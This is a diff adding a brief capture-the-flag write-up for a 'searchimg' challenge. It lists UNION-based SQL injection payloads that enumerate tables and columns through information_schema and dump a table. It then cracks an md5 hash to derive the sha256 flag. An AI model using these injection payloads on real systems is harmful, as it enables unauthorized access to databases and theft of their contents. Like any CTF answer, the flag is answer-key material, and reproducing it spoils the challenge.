@@ -1,0 +1,16 @@
+searchimg :
+
+id=1 and 1=0 union select null, table_name from information_schema.tables
+
+--> list_images
+
+id=1 and 1=0 union select null, column_name from information_schema.columns where table_name = 0x6c6973745f696d61676573
+
+--> id, url, title, comment
+
+id=1 and 1=0 union select title, comment from list_images
+
+--> "If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"
+
+md5 de 1928e8083cf461a51303633093573c46 -> albatroz
+sha256 de albatroz -> f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
